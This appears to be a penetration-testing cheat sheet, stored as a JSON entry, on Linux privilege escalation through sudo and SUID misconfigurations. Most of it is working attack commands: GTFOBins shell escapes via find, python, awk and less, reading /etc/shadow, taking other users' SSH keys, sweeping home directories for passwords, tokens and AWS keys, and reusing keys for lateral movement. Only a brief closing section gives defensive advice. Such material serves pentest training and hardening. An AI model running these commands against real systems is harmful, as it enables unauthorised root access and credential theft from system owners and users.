        "title": "Abusing SUIDs &  Important Files",
        "content": "\n---\n\n## üî• **Abusing SUID Binaries & Sudo Permissions for Privilege Escalation**\n\n---\n\n### 1. **Check Sudo Permissions (NOPASSWD?)**\n```bash\nsudo -l\n```\n**Interpret the output:**\n- `(ALL : ALL) NOPASSWD: /bin/bash` ‚Üí Instant root: `sudo /bin/bash`\n- `(root) NOPASSWD: /usr/bin/vim` ‚Üí Escalate via [GTFOBins ‚Äì vim](https://gtfobins.github.io/gtfobins/vim/#sudo)\n- `(ALL) NOPASSWD: /bin/kill` ‚Üí Less useful, but combined with other vectors, may help\n\n> ‚úÖ **Golden Rule**: If you can run **any** of the following as root via sudo (even without password), you win:\n> - Shells (`/bin/sh`, `/bin/bash`)\n> - Editors (`vim`, `nano`, `less`, `more`)\n> - Languages (`python`, `perl`, `ruby`, `php`)\n> - System tools (`find`, `awk`, `tar`, `cp`, `mv`)\n\n---\n\n### 2. **SUID Binary Enumeration**\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\nCommon dangerous SUID binaries (check [GTFOBins ‚Äì SUID](https://gtfobins.github.io/#+suid)):\n\n| Binary      | Exploit Example |\n|------------|------------------|\n| **`/usr/bin/find`** | `find . -exec /bin/sh \\; -quit` |\n| **`/usr/bin/python3`** | `python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'` |\n| **`/usr/bin/cp`** | Overwrite `/etc/passwd` if you control source |\n| **`/usr/bin/nano`** | Edit `/etc/passwd` or `/etc/shadow` |\n| **`/usr/bin/base64`** | Read files: `base64 /etc/shadow` |\n| **`/usr/bin/awk`** | `awk 'BEGIN {system(\"/bin/sh\")}'` |\n\n> üí° Always check **GTFOBins**:  \n> https://gtfobins.github.io/\n\n---\n\n### 3. **Switching Users**\n```bash\n# Switch to root (if sudo allows)\nsudo su -\n\n# Switch to another user\nsudo su - alice\nsu - alice          # Requires password (usually not useful)\nsudo -u alice id    # Run single command as alice\n\n# Useful for lateral movement or accessing user-specific secrets\nsudo -u bob cat /home/bob/.ssh/id_rsa\n```\n\n> üéØ If you can run commands as another user **without password**, check their home directory for **SSH keys** or **API tokens**.\n\n---\n\n### 4. **Log Inspection for Process Clues**\nSometimes cron jobs or services restart after crash ‚Äî logs reveal behavior:\n```bash\n# Check recent activity\ngrep -i \"cron\\|backup\\|update\" /var/log/syslog\ngrep \"find\" /var/log/syslog          # Did someone run find as root?\njournalctl -u cron --no-pager | tail -20\n```\n\n> üîç Look for:\n> - Root-owned processes using relative paths\n> - Scripts that load config from writable directories\n> - Failed sudo attempts (may reveal intended commands)\n\n---\n\n### 5. **Critical Hidden Files (Dotfiles) to Check**\nAlways inspect the **current user‚Äôs home** and **other users‚Äô homes** (if readable):\n\n```bash\n# Current user\nls -la ~/\ncat ~/.bashrc ~/.bash_history ~/.profile 2>/dev/null\n\n# Common sensitive dotfiles:\n~/.ssh/id_rsa          # Private SSH key\n~/.ssh/authorized_keys\n~/.mysql_history       # May contain passwords\n~/.psql_history        # PostgreSQL credentials\n~/.bashrc              # Custom PATH, aliases, hardcoded secrets\n~/.git-credentials     # Git tokens\n~/.aws/credentials     # Cloud access keys\n~/.config/filezilla/sitemanager.xml  # FTP creds\n```\n\n> üí° Pro tip:  \n> ```bash\n> grep -r \"password\\|passwd\\|secret\\|token\\|aws\" ~ 2>/dev/null\n> ```\n\n---\n\n### 6. **Automated Dotfile & Credential Hunting**\nUse **LinPEAS** or run:\n```bash\n# Quick credential sweep\ngrep -r \"password\" /home /root /etc 2>/dev/null | grep -v \".gz\"\nfind /home -name \"*.key\" -o -name \"id_rsa\" -o -name \"*.pem\" 2>/dev/null\n```\n\n---\n\n### 7. **Real-World Exploit Example**\n**Scenario**: `sudo -l` shows:\n```text\nUser hacker may run the following commands on target:\n    (root) NOPASSWD: /usr/bin/less\n```\n\n**Exploit**:\n```bash\nsudo less /etc/shadow\n# Inside less, type: `!/bin/bash`\n# ‚Üí Drops to root shell\n```\n‚úÖ From [GTFOBins ‚Äì less (sudo)](https://gtfobins.github.io/gtfobins/less/#sudo)\n\n---\n\n### 8. **If You Find a Private SSH Key**\n```bash\nchmod 600 id_rsa\nssh -i id_rsa root@localhost\n# Or use for lateral movement to other hosts\n```\n\n> üîê Always check if the key works **locally first** ‚Äî sometimes keys are reused across systems.\n\n---\n\n## üõ°Ô∏è **Defensive Tip (For Blue Teams)**\n- **Never** set NOPASSWD for editors, shells, or interpreters.\n- **Remove unnecessary SUID bits**: `chmod u-s /usr/bin/find` (if not needed).\n- **Restrict dotfile permissions**: `chmod 600 ~/.bashrc`, etc.\n- **Audit sudoers**: Use `visudo` and follow principle of least privilege.\n\n---\n"
